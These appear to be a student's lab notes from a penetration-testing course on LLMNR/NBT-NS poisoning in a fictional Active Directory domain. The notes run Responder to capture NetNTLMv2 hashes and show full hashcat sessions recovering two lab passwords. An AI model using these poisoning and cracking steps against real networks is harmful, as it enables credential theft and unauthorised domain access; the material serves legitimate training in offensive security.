- [[#Quick Example - LLMNR/NBT-NS Poisoning]]
- [[#TTPs]]
- [[#Responder in Action]]
    - [[#Responder Help]]
    - [[#Starting Responder with Default Settings]]
- [[#Cracking NTLMv2 Hash with Hashcat]]

---

- Objectives
    
    At this point, we have completed our initial enumeration of the domain. We obtained some basic user and group information, enumerated hosts while looking for critical services and roles like a Domain Controller, and figured out some specifics such as the naming scheme used for the domain. In this phase, we will work through two different techniques side-by-side: network poisoning and password spraying. We will perform these actions with the goal of acquiring valid cleartext credentials for a domain user account, thereby granting us a foothold in the domain to begin the next phase of enumeration from a credentialed standpoint.
    
    This section and the next will cover a common way to gather credentials and gain an initial foothold during an assessment: a Man-in-the-Middle attack on Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) broadcasts. Depending on the network, this attack may provide low-privileged or administrative level password hashes that can be cracked offline or even cleartext credentials. Though not covered in this module, these hashes can also sometimes be used to perform an SMB Relay attack to authenticate to a host or multiple hosts in the domain with administrative privileges without having to crack the password hash offline. Let's dive in!
    

# Quick Example - LLMNR/NBT-NS Poisoning

Let's walk through a quick example of the attack flow at a very high level:

1. A host attempts to connect to the print server at \\print01.inlanefreight.local, but accidentally types in \\printer01.inlanefreight.local.
2. The DNS server responds, stating that this host is unknown.
3. The host then broadcasts out to the entire local network asking if anyone knows the location of \\printer01.inlanefreight.local.
4. The attacker (us with Responder running) responds to the host stating that it is the \\printer01.inlanefreight.local that the host is looking for.
5. The host believes this reply and sends an authentication request to the attacker with a username and NTLMv2 password hash.
6. This hash can then be cracked offline or used in an SMB Relay attack if the right conditions exist.

# TTPs

Several tools can be used to attempt LLMNR & NBT-NS poisoning:

|   |   |
|---|---|
|Tool|Description|
|[Responder](https://github.com/lgandx/Responder)|Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.|
|[Inveigh](https://github.com/Kevin-Robertson/Inveigh)|Inveigh is a cross-platform MITM platform that can be used for spoofing and poisoning attacks.|
|[Metasploit](https://www.metasploit.com/)|Metasploit has several built-in scanners and spoofing modules made to deal with poisoning attacks.|

---

# Responder in Action

## Responder Help

```Shell
responder -h
```

- Logs are stored in: ==/usr/share/responder/logs==

![[Notion/CPTS/RESOURCES/image 14.png|image 14.png]]

- Hashes are saved in the format ==(MODULE_NAME)-(HASH_TYPE)-(CLIENT_IP).txt==

## Starting Responder with Default Settings

```Shell
Responder -I NetworkInterfaceCard
```

---

# Cracking NTLMv2 Hash with Hashcat

1. Save the Hash to a file

```Shell
                                           
┌──(root㉿kali)-[/home/kali/HTB/AD]
└─# echo "backupagent::INLANEFREIGHT:5b88c459fd58a6f9:55706B299F197E512159AB16DF46A627:010100000000000000107B612DFEDB013E7582B01E40E8AD0000000002000800370049004900420001001E00570049004E002D00320038004100560059005A004A0043004C004300560004003400570049004E002D00320038004100560059005A004A0043004C00430056002E0037004900490042002E004C004F00430041004C000300140037004900490042002E004C004F00430041004C000500140037004900490042002E004C004F00430041004C000700080000107B612DFEDB0106000400020000000800300030000000000000000000000000300000C36D58281844644CB5572440422FF0D0FE244EB43A64581DA591C25CD4C5DAC30A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0035002E003200320035000000000000000000
" > hash_ntlmv2
```

1. Crack it using Hashcat

```Shell
hashcat -m 5600 hash_ntlmv2 /usr/share/wordlists/rockyou.txt 
```

1. Cracked Result 1

```Shell
┌──(root㉿kali)-[/home/kali/HTB/AD]
└─# hashcat -m 5600 hash_ntlmv2 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 1435/2934 MB (512 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

BACKUPAGENT::INLANEFREIGHT:5b88c459fd58a6f9:55706b299f197e512159ab16df46a627:010100000000000000107b612dfedb013e7582b01e40e8ad0000000002000800370049004900420001001e00570049004e002d00320038004100560059005a004a0043004c004300560004003400570049004e002d00320038004100560059005a004a0043004c00430056002e0037004900490042002e004c004f00430041004c000300140037004900490042002e004c004f00430041004c000500140037004900490042002e004c004f00430041004c000700080000107b612dfedb0106000400020000000800300030000000000000000000000000300000c36d58281844644cb5572440422ff0d0fe244eb43a64581da591c25cd4c5dac30a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:h1backup55
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: BACKUPAGENT::INLANEFREIGHT:5b88c459fd58a6f9:55706b2...000000
Time.Started.....: Sat Jul 26 13:19:34 2025 (5 secs)
Time.Estimated...: Sat Jul 26 13:19:39 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1623.7 kH/s (0.54ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 7733248/14344385 (53.91%)
Rejected.........: 0/7733248 (0.00%)
Restore.Point....: 7731200/14344385 (53.90%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: h2nzyoo -> h101814
Hardware.Mon.#1..: Util: 26%

Started: Sat Jul 26 13:19:14 2025
Stopped: Sat Jul 26 13:19:40 2025
```

1. Cracked Result 2

```Shell
┌──(root㉿kali)-[/home/kali/HTB/AD]
└─# hashcat -m 5600 wley_ntlmv2 /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-sandybridge-13th Gen Intel(R) Core(TM) i9-13900HX, 1435/2934 MB (512 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

WLEY::INLANEFREIGHT:612a33fc1cdd4707:551b270a04c39394ee4c89e5e3da1182:0101000000000000001f542d2efedb013a01ef8532853b2400000000020008004b0030004100590001001e00570049004e002d0057004100450037004f0030004700590037005600460004003400570049004e002d0057004100450037004f003000470059003700560046002e004b003000410059002e004c004f00430041004c00030014004b003000410059002e004c004f00430041004c00050014004b003000410059002e004c004f00430041004c0007000800001f542d2efedb0106000400020000000800300030000000000000000000000000300000c36d58281844644cb5572440422ff0d0fe244eb43a64581da591c25cd4c5dac30a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0035002e003200320035000000000000000000:transporter@4
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: WLEY::INLANEFREIGHT:612a33fc1cdd4707:551b270a04c393...000000
Time.Started.....: Sat Jul 26 13:21:30 2025 (2 secs)
Time.Estimated...: Sat Jul 26 13:21:32 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1823.4 kH/s (0.53ms) @ Accel:256 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 3098624/14344385 (21.60%)
Rejected.........: 0/3098624 (0.00%)
Restore.Point....: 3096576/14344385 (21.59%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: trapping1 -> tramore1993
Hardware.Mon.#1..: Util: 25%

Started: Sat Jul 26 13:21:30 2025
Stopped: Sat Jul 26 13:21:33 2025
```